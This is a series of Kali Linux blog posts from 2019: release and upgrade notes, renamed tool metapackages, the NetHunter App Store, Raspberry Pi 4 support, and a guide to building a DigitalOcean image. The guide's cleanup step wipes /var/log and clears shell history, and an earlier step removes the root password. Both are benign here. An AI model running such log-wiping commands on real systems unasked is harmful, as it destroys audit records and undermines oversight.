<p>All of the RaspberryPi images have had their <code>/boot</code> partition increased, which is required due to the size of the new kernel packages.</p> <p>The ODROID-C2 has been bumped to the 3.16.72 for its kernel.</p> <p>All images now run <code>dpkg-reconfigure xfonts-base</code> on their first boot - this will cause a bit of a slow down for the first boot, but the result is that if you use VNC to any of them, they will no longer show a blank screen.</p> <p>On the <a href="https://www.kali.org/blog/kali-on-the-windows-subsystem-for-linux/">WSL</a> front, we have added WSL ARM64 support, which you can find in the <a href="https://www.microsoft.com/en-us/p/kali-linux/9pkr34tncv07?rtc=1&amp;activetab=pivot:overviewtab">Windows store</a> today.</p> <h2 id="official-kali-linux-lxd-container-image-released">Official Kali Linux LXD Container Image Released</h2> <p>LXD is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.</p> <p>It is image based with pre-made images available for a wide number of Linux distributions and we are excited to announce that Kali Linux is now one of them. We are working on the documentation but would like to share the excellent article from <a href="https://blog.simos.info/using-the-lxd-kali-container-image/">Simos Xenitellis</a> in which he details how to install and run Kismet in a LXD Kali container.</p> <h2 id="setup-notes">Setup Notes</h2> <p>A couple of notes when installing Kali. If you choose to install Kali in a VM (rather than <a href="https://www.kali.org/get-kali/#kali-vm">downloading our pre-made image</a>), during the setup process, it should now detect if its running in <a href="https://www.kali.org/docs/virtualization/install-vmware-guest-tools/">VMware</a> or <a href="https://www.kali.org/docs/virtualization/install-virtualbox-guest-additions/">VirtualBox</a> and install the necessary packages to give you the best experience possible. However, if you have upgraded Kali rather than doing a fresh install, and never got around to installing these packages, the process has been automated by just running <code>kali-setup</code>. This program will have more functionally at a later date.</p> <p>If you use Kali in a VirtualBox, please ensure you allocate 32 MB or more video memory to the VM, otherwise you may now run into some &ldquo;interesting&rdquo; issues where the screen is frozen after login through the graphical greeter, as if the computer had crashed, except that it&rsquo;s working (you could confirm it by switching to another virtual terminal). If you are affected by this <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=934483">problem</a>, you might see the following message from the kernel: <code>[drm] Error -12 pinnning new fb, out of video mem?</code>.</p> <p>If you are using Kali Linux via <a href="https://www.kali.org/blog/announcing-kali-for-vagrant/">Vagrant</a>, the path has now changed. It can now be found here: <a href="https://app.vagrantup.com/kalilinux">kalilinux/rolling</a>.</p> <h2 id="download-kali-linux-20193">Download Kali Linux 2019.3</h2> <p>If you would like to check out the latest Kali release, you can find the download links for ISOs and Torrents on the <a href="https://www.kali.org/get-kali/">Kali Downloads page</a> along with links to the <a href="https://www.kali.org/get-kali/#kali-vm">OffSec virtual machine and ARM images</a>, which have also been updated to 2019.3. If you already have a Kali installation you&rsquo;re happy with, you can easily upgrade in place as follows:</p> <pre><code class="language-console">root@kali:~# apt update &amp;&amp; apt -y full-upgrade </code></pre> <h2 id="ensuring-your-installation-is-updated">Ensuring your Installation is Updated</h2> <p>To double check your version, first make sure your Kali package repositories are correct:</p> <pre><code class="language-console">root@kali:~# cat &lt;&lt;EOF&gt;/etc/apt/sources.list deb http://http.kali.org/kali kali-rolling main contrib non-free EOF root@kali:~# root@kali:~# apt update </code></pre> <p>Afterwards run <code>apt -y full-upgrade</code>, you may require a <code>reboot</code> (if the kernel got upgraded):</p> <pre><code class="language-console">root@kali:~# apt -y full-upgrade ... root@kali:~# root@kali:~# [ -f /var/run/reboot-required ] &amp;&amp; reboot -f root@kali:~# </code></pre> <p>You should now be on Kali Linux 2019.3. We can do a quick check by doing:</p> <pre><code class="language-console">root@kali:~# grep VERSION /etc/os-release VERSION=&quot;2019.3&quot; VERSION_ID=&quot;2019.3&quot; VERSION_CODENAME=&quot;kali-rolling&quot; root@kali:~# root@kali:~# uname -v #1 SMP Debian 5.2.9-2kali1 (2019-08-22) root@kali:~# root@kali:~# uname -r 5.2.0-kali2-amd64 root@kali:~# </code></pre> <p>NOTE: The output of <code>uname -r</code> may be different depending on <a href="https://pkg.kali.org/pkg/linux-latest">architecture</a>.</p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/main_page.php">bug tracker</a>. We&rsquo;ll never be able to fix what we don&rsquo;t know about.</p></description>
</item>
<item>
<title>Major Metapackage Makeover</title>
<link>https://www.kali.org/blog/major-metapackage-makeover/</link>
<guid isPermaLink="true">https://www.kali.org/blog/major-metapackage-makeover/</guid>
<pubDate>Thu, 22 Aug 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/major-metapackage-makeover/images/refreshing-kali-metapackages-1.jpg" type="image/jpg"/>
<description><p>With our 2019.3 Kali release imminent, we wanted to take a quick moment to discuss one of our more significant upcoming changes: our selection of metapackages. These alterations are designed to optimize Kali, reduce ISO size, and better organize metapackages as we continue to grow.</p> <p>Before we get into what&rsquo;s new, let&rsquo;s briefly recap what a metapackage is. A metapackage is a package that does not contain any tools itself, but rather is a dependency list of normal packages (or other metapackages). This allows us to group related tools together. For instance, if you want to be able to access every wireless tool, simply install the <code>kali-tools-wireless</code> metapackage. This will obtain all wireless tools in one download. As always, you can access the full list of metapackages available in Kali on <a href="https://www.kali.org/docs/general-use/metapackages/">kali.org/docs/general-use/metapackages/</a>. If you prefer to use the command line, the following command will list out the packages that will be installed via a specific metapackage:</p> <pre><code class="language-console">root@kali:~# apt update Hit:1 http://http.kali.org/kali kali-rolling InRelease Reading package lists... Done Building dependency tree Reading state information... Done All packages are up to date. root@kali:~# root@kali:~# apt depends kali-tools-wireless kali-tools-wireless Depends: kali-tools-802-11 Depends: kali-tools-bluetooth Depends: kali-tools-rfid Depends: kali-tools-sdr Depends: killerbee Depends: rfcat Depends: rfkill rfkill:i386 Depends: sakis3g Depends: spectools Depends: wireshark root@kali:~# </code></pre> <p>We took the time to create new metapackages and rename existing ones, and we did the same with the tools listed inside of them. As a result of these changes, we&rsquo;ve implemented a new naming convention for simplicity and improved granular control. At the end of the post there is a table displaying the relationships between previous and new names moving forward, along with a description of the metapackage purpose.</p> <p>If you have made it this far, you are likely wondering &ldquo;how does this affect me&rdquo;?</p> <ul> <li>If you are using a version of Kali older than 2019.3, if and when you upgrade, you will still have the same set of tools (just newer)!</li> <li>However, if you do a fresh install of Kali with a version higher than either <a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly W34</a> or 2019.3 ISO, you will notice some of the <strong>tools that get installed by DEFAULT have changed</strong> <em>(we have put Kali on a diet!)</em></li> </ul> <p>Previously, <code>kali-linux-full</code> was the default metapackage, which has been renamed to <code>kali-linux-large</code> with a redirect put in place. We have introduced a new default metapackage called <code>kali-linux-default</code>, which serves as a slimmed-down version of the tools from <code>kali-linux-large</code>.</p> <p>Depending on how you use Kali will determine which metapackage would suit you best. This is the power of metapackages. For example:</p> <ul> <li>If you want a core set of tools, stick with <code>kali-linux-default</code> <em>(designed for assessments that are straightforward )</em>.</li> <li>If you want a more general and wider range of tools, select <code>kali-linux-large</code> <em>(useful if Internet access is permitted but slow)</em>.</li> <li>If you want to be prepared for anything, go with <code>kali-linux-everything</code> <em>(great if you are going to be doing air-gap/offline work)</em></li> </ul> <p><em>Note: You can install multiple metapackages at once and are not limited to just one, so mix and match!</em></p> <p>Each of these metapackages depends on the one above. That means, when we add a new essential tool to <code>kali-linux-default</code>, it is automatically part of <code>kali-linux-large</code> and thus <code>kali-linux-everything</code>. Otherwise, when we add a new tool that may not be useful to everyone, it will be placed into either <code>kali-linux-large</code> or <code>kali-linux-everything</code> - depending on our tool policy. More information about the new tool policy will be made public towards the end of the year. Stay tuned for some very exciting news!</p> <p>How Kali is being used today has changed since when Kali (and even <a href="https://www.backtrack-linux.org/">BackTrack</a>) was first born. Not everyone needs all the tools at once - but they are still available when required. We have opted for a new default set of tools to match the majority of today&rsquo;s current network environments, by removing edge cases and legacy tools which are rarely used.</p> <p>Upon doing a system upgrade (<code>apt -y full-upgrade</code>) on a version of Kali older than 2019.3, you will see the old metapackage name being removed. This is safe. If you have tried to remove a tool before, you may have run into this (when the tool is part of a metapackage). This is also safe to remove, as it doesn&rsquo;t remove any other tools. It simply means that when a new tool is added into that metapackage, you won&rsquo;t receive it.</p> <p>If you are running 2019.3 and want the old default set of tools, you can do either <code>apt -y install &lt;tool&gt;</code> for a one-off package installation or <code>apt -y install kali-linux-large</code> to get the old tool set back. For the 2019.3 release, we will be doing a one-off extra image, which is based on <code>kali-linux-large</code> to help with the transition.</p> <p>Below are the tables with a complete breakdown of previous metapackages names, along with their new respective names:</p> <h4 id="systems">Systems</h4> <p>These metapackages are used when generating our images</p> <table> <thead> <tr> <th><strong>Old</strong></th> <th><strong>New</strong></th> <th>Notes</th> </tr> </thead> <tbody> <tr> <td>kali-linux</td> <td>kali-linux-core</td> <td>Base Kali Linux System - core items that are always included</td> </tr> <tr> <td><em>new</em></td> <td>kali-linux-default</td> <td>&ldquo;Default&rdquo; desktop (amd64/i386) images include these tools</td> </tr> <tr> <td><em>new</em></td> <td>kali-linux-light</td> <td>Kali-Light images use this to be generated</td> </tr> <tr> <td><em>new</em></td> <td>kali-linux-arm</td> <td>All tools suitable for ARM devices</td> </tr> <tr> <td>kali-linux-nethunter</td> <td>kali-linux-nethunter <em>(same)</em></td> <td>Tools used as part of Kali NetHunter</td> </tr> </tbody> </table> <h4 id="kali-menu">Kali Menu</h4> <p>These entries are based around the Kali menu</p> <table> <thead> <tr> <th><strong>Old</strong></th> <th><strong>New</strong></th> <th>Notes</th> </tr> </thead> <tbody> <tr> <td><em>new</em></td> <td>kali-tools-information-gathering</td> <td>Used for Open-source Intelligence (OSINT) &amp; information gathering</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-vulnerability</td> <td>Vulnerability assessments tools</td> </tr> <tr> <td>kali-linux-web</td> <td>kali-tools-web</td> <td>Designed doing web applications attacks</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-database</td> <td>Based around any database attacks</td> </tr> <tr> <td>kali-linux-pwtools</td> <td>kali-tools-passwords</td> <td>Helpful for password cracking attacks - Online &amp; offline</td> </tr> <tr> <td>kali-linux-wireless</td> <td>kali-tools-wireless</td> <td>All tools based around Wireless protocols - 802.11, Bluetooth, RFID &amp; SDR</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-reverse-engineering</td> <td>For reverse engineering binaries</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-exploitation</td> <td>Commonly used for doing exploitation</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-social-engineering</td> <td>Aimed for doing social engineering techniques</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-sniffing-spoofing</td> <td>Any tools meant for sniffing &amp; spoofing</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-post-exploitation</td> <td>Techniques for post exploitation stage</td> </tr> <tr> <td>kali-linux-forensics</td> <td>kali-tools-forensics</td> <td>Forensic tools - Live &amp; Offline</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-reporting</td> <td>Reporting tools</td> </tr> </tbody> </table> <h4 id="tools">Tools</h4> <p>These are tool listing based on the category and type</p> <table> <thead> <tr> <th><strong>Old</strong></th> <th><strong>New</strong></th> <th>Notes</th> </tr> </thead> <tbody> <tr> <td>kali-linux-gpu</td> <td>kali-tools-gpu</td> <td>Tools which benefit from having access to GPU hardware</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-hardware</td> <td>Hardware hacking tools</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-crypto-stego</td> <td>Tools based around Cryptography &amp; Steganography</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-fuzzing</td> <td>For fuzzing protocols</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-802-11</td> <td>802.11 (Commonly known as &ldquo;Wi-Fi&rdquo;)</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-bluetooth</td> <td>For targeting Bluetooth devices</td> </tr> <tr> <td>kali-linux-rfid</td> <td>kali-tools-rfid</td> <td>Radio-Frequency IDentification tools</td> </tr> <tr> <td>kali-linux-sdr</td> <td>kali-tools-sdr</td> <td>Software-Defined Radio tools</td> </tr> <tr> <td>kali-linux-voip</td> <td>kali-tools-voip</td> <td>Voice over IP tools</td> </tr> <tr> <td><em>new</em></td> <td>kali-tools-windows-resources</td> <td>Any resources which can be executed on a Windows hosts</td> </tr> </tbody> </table> <h4 id="misc">Misc</h4> <p>Useful metapackages which are &ldquo;one off&rdquo; groupings</p> <table> <thead> <tr> <th><strong>Old</strong></th> <th><strong>New</strong></th> <th>Notes</th> </tr> </thead> <tbody> <tr> <td>kali-linux-full</td> <td>kali-linux-large</td> <td>Our previous default tools for amd64/i386 images</td> </tr> <tr> <td>kali-linux-all</td> <td>kali-linux-everything</td> <td>Every metapackage and tool listed here</td> </tr> <tr> <td>kali-linux-top10</td> <td>kali-tools-top10</td> <td>The most commonly used tools</td> </tr> <tr> <td>kali-desktop-live</td> <td>kali-desktop-live <em>(same)</em></td> <td>Used during a live session when booted from the image</td> </tr> <tr> <td><del><em>new</em></del></td> <td><del>kali-tools-headless</del></td> <td><del>Tools which do not require a GUI in order to access them</del></td> </tr> </tbody> </table> <h4 id="courses">Courses</h4> <p>Tools used for OffSec&rsquo;s courses</p> <table> <thead> <tr> <th><strong>Old</strong></th> <th><strong>New</strong></th> <th>Notes</th> </tr> </thead> <tbody> <tr> <td><em>new</em></td> <td>offsec-awae</td> <td>Advanced Web Attacks and Exploitation</td> </tr> <tr> <td><em>new</em></td> <td>offsec-pwk</td> <td>Penetration Testing with Kali</td> </tr> </tbody> </table> <h4 id="desktop-managers">Desktop Managers</h4> <p>Desktop Environment (DE) &amp; Window Manager (WM)</p> <table> <thead> <tr> <th><strong>Old</strong></th> <th><strong>New</strong></th> <th>Notes</th> </tr> </thead> <tbody> <tr> <td>kali-desktop-common</td> <td>kali-desktop-core</td> <td>Any key tools required for a GUI image</td> </tr> <tr> <td><em>new</em></td> <td>kali-desktop-e17</td> <td>Enlightenment (WM)</td> </tr> <tr> <td>kali-desktop-gnome</td> <td>kali-desktop-gnome <em>(same)</em></td> <td>GNOME (DE)</td> </tr> <tr> <td><em>new</em></td> <td>kali-desktop-i3</td> <td>i3 (WM)</td> </tr> <tr> <td>kali-desktop-kde</td> <td>kali-desktop-kde <em>(same)</em></td> <td>KDE (DE)</td> </tr> <tr> <td>kali-desktop-lxde</td> <td>kali-desktop-lxde <em>(same)</em></td> <td>LXDE (WM)</td> </tr> <tr> <td><em>new</em></td> <td>kali-desktop-mate</td> <td>MATE (DE)</td> </tr> <tr> <td><del><em>new</em></del></td> <td><del>kali-desktop-pantheon</del></td> <td><del>Pantheon (DE)</del></td> </tr> <tr> <td>kali-desktop-xfce</td> <td>kali-desktop-xfce <em>(same)</em></td> <td>XFCE (WM)</td> </tr> </tbody> </table> <p>If you wish to create your own metapackage, see how we do it <a href="https://gitlab.com/kalilinux/packages/kali-meta/tree/kali/master">here</a>, before you create your own <a href="https://web.archive.org/web/20210914172345/https://kali.training/topic/extending-and-customizing-kali/">package</a>.</p></description>
</item>
<item>
<title>Kali NetHunter App Store - Public Beta</title>
<link>https://www.kali.org/blog/kali-nethunter-app-store/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-nethunter-app-store/</guid>
<pubDate>Mon, 15 Jul 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-nethunter-app-store/images/kali-nethunter-store-1.jpg" type="image/jpg"/>
<description><p>Kali NetHunter has been undergoing a ton of changes of late. Now supporting over 50 devices and running on Android devices from KitKat (v4.4) to Pie (v9.0), its amazing the extra capabilities that have been introduced.</p> <p>But, we don&rsquo;t want to stop there. After a ton of work, we are really excited to introduce the <a href="https://store.nethunter.com/">Kali NetHunter App Store</a>!</p> <h2 id="the-new-android-store-dedicated-to-free-security-apps">The New Android Store Dedicated to Free Security Apps</h2> <p>Originally meant to conveniently manage the packages on NetHunter devices, we soon realized that the NetHunter store should also be available for non-NetHunter devices. So here it is, available to everyone that would like the best of both worlds:</p> <ul> <li>Ease of use and convenience of the Google Play Store</li> <li>Freedom, anonymity and privacy of sideloaded applications</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-nethunter-app-store/images/nethunter-store-02.png'> <img src="https://www.kali.org/blog/kali-nethunter-app-store/images/nethunter-store-02.png" alt="" /> </a> </p> </p> <p>The Kali NetHunter App Store is a one stop shop for security relevant Android applications. It is the ultimate alternative to the Google Play store for any Android device, whether rooted or not, NetHunter or stock. If you are after any security application for your Android device, the NetHunter Store will be the place to get it.</p> <p>The NetHunter store is powered by a slightly modified version of <a href="https://f-droid.org/en/">F-Droid</a>, thanks to the hard work of the F-Droid community, in particular <a href="https://twitter.com/serwylo">Peter Serwylo</a> whose help was invaluable. Whilst F-Droid installs its clients with telemetry disabled and asks for consent before submitting crash reports, we went a step further and removed the entire code - just to make sure that our privacy cannot be compromised by accident.</p> <p>We also widened the inclusion policy to allow proprietary applications into the store.</p> <h3 id="call-for-applications">Call for Applications</h3> <p>If you are an application developer and you would like your application to be included in the NetHunter App Store, please let us know via a <a href="https://gitlab.com/kalilinux/nethunter/store/rfp/-/issues">Request for packaging</a> or in the <a href="https://forums.kali.org/forumdisplay.php?35-App-Store">forums</a>.</p> <p>Please note: We accept binary APK files as well as links to git repositories that we use to build the applications ourselves. Third party APK files are preferably signed by the original author whereas apps built by us from source are built using GitLab CI and are signed by us.</p> <p>If you would like us to include an application that you are not the author of, please let us know and we&rsquo;ll try to get the authors consent to publish it in our store.</p> <p>More information about contributing applications can be found <a href="https://store.nethunter.com/en/contribute/">here</a></p> <h3 id="call-for-feedback">Call for Feedback</h3> <p>We encourage all Android users to head over to the <a href="https://store.nethunter.com/">NetHunter App Store (https://store.nethunter.com/)</a>, download the Store app, have a go and join us in the <a href="https://forums.kali.org/forumdisplay.php?35-App-Store">forums</a> to give us feedback and get involved.</p> <h3 id="call-for-contributors">Call for Contributors</h3> <p>NetHunter is a community project. It is driven by the community for the community and it is a whole lot of fun. The project is centered around bringing Kali Linux to Android devices and to add a user experience that makes Android a valid alternative for certain areas of penetration testing and hacking.</p> <p>Working on the NetHunter project, including the NetHunter Store, provides exposure to a wide variety of technologies, such as:</p> <ul> <li>Android app development</li> <li>Rooting Android &amp; creating custom recovery installers</li> <li>Kernel &amp; kernel drivers, in particular WiFi</li> <li>Kali Linux</li> <li>All tools that ship with Kali Linux</li> <li>Web technologies</li> <li>Android package management</li> <li>&hellip;and many more.</li> </ul> <p>But most importantly:</p> <ul> <li>Putting it all together and hack Radio frequency (RF), Wi-Fi, Apps and everything else you can get your hands on!</li> </ul> <p>If you are good at any of the above, or you would like to become good at any of them, please join us in the <a href="https://forums.kali.org/forumdisplay.php?35-App-Store">forums</a> or on <a href="https://www.kali.org/docs/community/kali-linux-irc-channel/">IRC</a> OFTC, #NetHunter](<a href="https://webchat.oftc.net/?randomnick=1&amp;channels=nethunter)">https://webchat.oftc.net/?randomnick=1&amp;channels=nethunter)</a>.</p></description>
</item>
<item>
<title>Raspberry Pi 4 and Kali</title>
<link>https://www.kali.org/blog/raspberry-pi-4-and-kali/</link>
<guid isPermaLink="true">https://www.kali.org/blog/raspberry-pi-4-and-kali/</guid>
<pubDate>Fri, 05 Jul 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/raspberry-pi-4-and-kali/images/kali-raspberry-pi-4.jpg" type="image/jpg"/>
<description><p>We love the Raspberry Pi, and judging by the response we got to a <a href="https://twitter.com/kalilinux/status/1144895236025585665">late night tweet</a> we sent out last weekend a lot of you love the Pi too!</p> <p>Because of that, when the <a href="https://www.raspberrypi.org/blog/raspberry-pi-4-on-sale-now-from-35/">Pi 4 dropped</a> we wanted to get Kali supported on it right away.</p> <h2 id="whats-new-on-the-raspberry-pi-4">What&rsquo;s new on the Raspberry Pi 4?</h2> <p>The Raspberry Pi 4 is actually a pretty amazing little machine. The Pi has always been known for its low cost and easy accessibility, but with the 4 we can actually throw real performance onto that list as well.</p> <p>With the Raspberry Pi 4 we have a completely upgraded, re-engineered device that includes:</p> <ul> <li>A more powerful CPU</li> <li>Options for 1, 2, or 4 GB of RAM</li> <li>USB-C power supply</li> <li>USB 2 &amp; USB 3</li> <li>Gigabit ethernet</li> <li>2 micro HDMI ports</li> </ul> <p>And now you can add to that list full Kali Linux support complete with on-board wifi monitor mode &amp; frame injection support!</p> <p><p> <a href='https://www.kali.org/blog/raspberry-pi-4-and-kali/images/kali-pi4.png'> <img src="https://www.kali.org/blog/raspberry-pi-4-and-kali/images/kali-pi4.png" alt="" /> </a> </p> </p> <p>To say we are excited about this is an understatement, and we hope many of you are just as excited!</p> <h2 id="try-it-out">Try it out!</h2> <p>You can download Kali Linux for the Raspberry Pi 4 on the <a href="https://www.kali.org/get-kali/#kali-arm">Kali ARM download page</a>. Currently we only have 32Bit support for it, but expect 64Bit in the near future. The installation instructions are not any different than the Pi2, so feel free to <a href="https://www.kali.org/docs/arm/raspberry-pi-2/">follow our docs</a> on getting it setup if you don&rsquo;t know how.</p> <p>Once you have it running feel free to let us know how its working for you <a href="https://forums.kali.org/forumdisplay.php?7-Kali-Linux-ARM-Architecture">on our forums</a>. Stay tuned for more Pi updates as we work with the 4 and find new and interesting things to do with it!</p></description>
</item>
<item>
<title>Kali Linux in the DigitalOcean Cloud</title>
<link>https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/</guid>
<pubDate>Tue, 02 Jul 2019 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/kali-digital-ocean.jpg" type="image/jpg"/>
<description><p><a href="https://www.digitalocean.com/">DigitalOcean</a> is a cloud provider similar to AWS, Microsoft Azure, Google Cloud Platform, and many others. They offer instances, called &ldquo;droplets&rdquo;, with different Linux distributions such as Debian, Ubuntu, FreeBSD, etc. Similar to AWS, DigitalOcean has datacenters around the world and sometimes multiple datacenters in each country.</p> <p>However, one feature in particular sets them apart them from their competitors. A little while ago, they added support for <a href="https://blog.digitalocean.com/custom-images/">custom images</a>, which allows users to import virtual machine disks and use them as droplets. This is perfect for us as we can use our own version of Kali Linux in their cloud.</p> <p>While it might be possible to load the <a href="https://www.kali.org/get-kali/#kali-vm">official Kali Linux virtual images</a>, it wouldn&rsquo;t be very efficient. Instead, we&rsquo;ll build a lightweight Kali installation with the bare minimum to get it working.</p> <h2 id="generate-an-iso">Generate an ISO</h2> <p>By default, the Kali Linux ISOs have a GUI installed, and while we could use it, we want to minimize the amount of data we have to upload to DigitalOcean for reasons we will talk about later. Having a GUI running on a headless system is also a waste of resources so while we could uninstall it or disable it, we&rsquo;ll <a href="https://www.kali.org/docs/development/live-build-a-custom-kali-iso/">just generate a custom Kali ISO</a> without a GUI or any other tools installed. Building the ISO will require around 5 GB of hard drive space so make sure you have enough if you&rsquo;re following along.</p> <p>First, we&rsquo;ll make sure the system is up to date:</p> <pre><code class="language-sh">apt update apt -y full-upgrade </code></pre> <p>In case a new kernel was installed, let&rsquo;s reboot the system before continuing and then proceed to start the build:</p> <pre><code class="language-sh">apt -y install git live-build cdebootstrap devscripts git clone https://gitlab.com/kalilinux/build-scripts/live-build-config.git cd live-build-config ./build.sh --variant minimal --verbose </code></pre> <p>It will take a while to build the ISO as it needs to download a lot of packages and assemble them. In the meantime, enjoy a nice cup of joe. Or tea.</p> <p>The &lsquo;&ndash;verbose&rsquo; option will display the build log on the screen. It can however be removed, and instead progress can be followed in the <strong><em>build.log</em></strong> file:</p> <pre><code class="language-sh">tail -f build.log </code></pre> <p>Once our prompt returns on the terminal where &lsquo;build.sh&rsquo; was launched, the ISO is ready and can be found in the <strong><em>images/</em></strong> directory.</p> <h2 id="create-the-virtual-machine">Create the Virtual Machine</h2> <p>With our ISO built, we can now begin to build our virtual machine. Create a new virtual machine setting the OS to the latest Debian 64 bit and allocating a 20 GB hard disk. If needed, detailed set-up is explained on the <a href="https://web.archive.org/web/20210914172345/https://kali.training/topic/booting-kali-in-live-mode/">Kali Training website</a>. It is important to store the virtual disk as a single file that is dynamically allocated. The rest like the amount of CPU and RAM won&rsquo;t matter because only the disk file will be uploaded to DigitalOcean.</p> <p>Disk size matters as billing is based on disk size for custom images. It will also impact the choice of instance we can create. Let&rsquo;s say a 40 GB hard disk is created, it will fail creating an instance at the $5/month level because its maximum hard disk size is 25 GB. In that case we would be forced to use the $10/month option for instances with 50 GB disks. Don&rsquo;t worry, even though the disk is 20 GB, it will get expanded depending on the droplet plan chosen.</p> <p>During the installation, select manual partitioning and set it up as shown below, with all files in one partition and no swap file.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture1-1.png'> <img src="https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture1-1.png" alt="" /> </a> </p> </p> <h2 id="update-the-system">Update the System</h2> <p>When installation is complete and after rebooting, we login at the console and update the system:</p> <pre><code class="language-sh">apt update apt -y full-upgrade </code></pre> <p>If you don&rsquo;t see it going over a mirror during &lsquo;apt update&rsquo;, you may have accidentally forgotten to add a network mirror during the installation. Follow the <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">instructions on the Kali-Docs site</a> to fix it and run both of the commands again.</p> <h3 id="install-required-packages">Install Required Packages</h3> <p>In order for DigitalOcean to configure the system for us, we need to install the <strong><em>cloud-init</em></strong> package:</p> <pre><code class="language-sh">apt -y install cloud-init echo 'datasource_list: [ ConfigDrive, DigitalOcean, NoCloud, None ]' &gt; /etc/cloud/cloud.cfg.d/99_digitalocean.cfg systemctl enable cloud-init </code></pre> <h3 id="update-grub">Update GRUB</h3> <p>When booting, the disk is attached and mapped as sda1. However, with the droplets, it is seen as vda1. To remedy this, we need to change all instances of sda1 to vda1 in <strong><em>/boot/grub/grub.cfg</em></strong>:</p> <pre><code class="language-sh">sed -i 's/sda1/vda1/g' /boot/grub/grub.cfg </code></pre> <p>With the configuration file updated, we can run &lsquo;update-grub&rsquo; to update the system:</p> <pre><code class="language-sh">update-grub </code></pre> <h3 id="prepare-for-ssh">Prepare for SSH</h3> <p>Since we will need to use SSH to connect to the system on DigitalOcean, the <strong><em>openssh-server</em></strong> package needs to be installed (and enabled) as well:</p> <pre><code class="language-sh">apt -y install openssh-server systemctl enable ssh.service </code></pre> <p>When creating a standard droplet, you can choose to use SSH keys or not. However, when using custom images, this isn&rsquo;t an option and using SSH keys is mandatory. For this reason, DigitalOcean requires us to remove the root password:</p> <pre><code class="language-sh">passwd -d root </code></pre> <p>We also need to create a <strong><em>/root/.ssh</em></strong> folder:</p> <pre><code class="language-sh">mkdir /root/.ssh </code></pre> <h3 id="cleanup">Cleanup</h3> <p>Before we finish with our virtual machine, we run a few commands to clean things up:</p> <pre><code class="language-sh">apt autoremove apt autoclean rm -rf /var/log/* history -c </code></pre> <p>At this point, our virtual machine is ready so we run &lsquo;poweroff&rsquo; to shutdown the system:</p> <pre><code class="language-sh">poweroff </code></pre> <h2 id="uploading">Uploading</h2> <p>In the virtual machine folder, locate the <strong><em>.vmdk</em></strong> file, then compress it using bzip2, gzip, or zip in preparation for uploading to DigitalOcean:</p> <pre><code class="language-sh">bzip2 kali.vmdk </code></pre> <p>Login to your DigitalOcean account. In the &ldquo;Manage&rdquo; section on the left, click on &ldquo;Images&rdquo;, then select the &ldquo;Custom Images&rdquo; tab.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture2.png'> <img src="https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture2.png" alt="" /> </a> </p> </p> <p>From there, we upload the compressed disk image. We&rsquo;ll name it Kali, mark it as Debian, and select the region and datacenter to upload it to. Note that once uploaded to a location, droplets can only be started at that location, which is a current limitation for custom images. Another thing to remember at this stage is that uploaded images consume disk space and DigitalOcean will bill based on disk usage.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture3-1.png'> <img src="https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture3-1.png" alt="" /> </a> </p> </p> <h2 id="starting-a-droplet">Starting a Droplet</h2> <p>Once done, the &ldquo;Uploaded&rdquo; column will indicate how long ago it was uploaded. Now we will click on the &ldquo;More&rdquo; option of the image and select &ldquo;Start a droplet&rdquo;.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture4.png'> <img src="https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture4.png" alt="" /> </a> </p> </p> <p>You will be taken to the droplet settings where you can select the droplet plan, the SSH key, and the project to start it in. Since this is a custom image, it is required you use a SSH key. You can either select an existing one or upload a new one by clicking on &ldquo;New SSH key&rdquo;, which will open the following screen where you can paste the public key and name it:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture5-1.png'> <img src="https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture5-1.png" alt="" /> </a> </p> </p> <p>Once done, click &ldquo;Create&rdquo; as shown below. It will then take you back to the dashboard (Manage &gt; Droplets) where all your droplets are listed. Because we are using a SSH key, DigitalOcean will not send an email with credentials for the droplet.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture5b.png'> <img src="https://www.kali.org/blog/kali-linux-in-the-digitalocean-cloud/images/Picture5b.png" alt="" /> </a> </p> </p> <p>Within a few seconds, and after the IP is displayed, our droplet will be ready. In order to connect, we will need to use the private SSH key we created (called MY_KEY in this example):</p> 